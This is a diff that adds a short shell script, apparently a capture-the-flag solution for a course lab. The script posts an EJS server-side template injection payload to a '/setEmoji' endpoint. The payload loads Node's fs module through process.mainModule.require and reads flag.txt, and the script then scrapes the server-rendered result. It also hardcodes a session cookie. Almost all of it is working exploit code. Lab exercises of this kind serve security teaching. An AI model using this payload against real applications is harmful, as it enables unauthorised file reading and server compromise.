@@ -1,0 +1,14 @@
+# LAB ONLY — do not run on external targets
+HOST='https://2ddb8446.proxy.coursestack.com'
+COOKIE='token=2ddb8446-33b8-4945-bb9a-2aad49947ce3_1_d09ccd9bc3e32f445caddee174a9d833b7bdf37f2d1610d8d45a65c8355dc091'
+
+# 1) Set EJS payload that loads fs via mainModule.require and reads the flag
+curl -sS "$HOST/setEmoji" \
+  -H 'Origin: '"$HOST" -H 'Referer: '"$HOST"'/' \
+  -H 'X-Requested-With: XMLHttpRequest' \
+  -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
+  --cookie "$COOKIE" \
+  --data-urlencode 'emoji=<%= (process.mainModule||process["mainModule"]).require("fs").readFileSync("flag.txt","utf8") %>' >/dev/null
+
+# 2) Fetch page and print ONLY the server-rendered span (before client JS overwrites it)
+curl -sS -H "Cookie: $COOKIE" "$HOST/" | perl -0777 -ne 'print "$1\n" if /id="currentEmoji">(.*?)<\/span>/s'
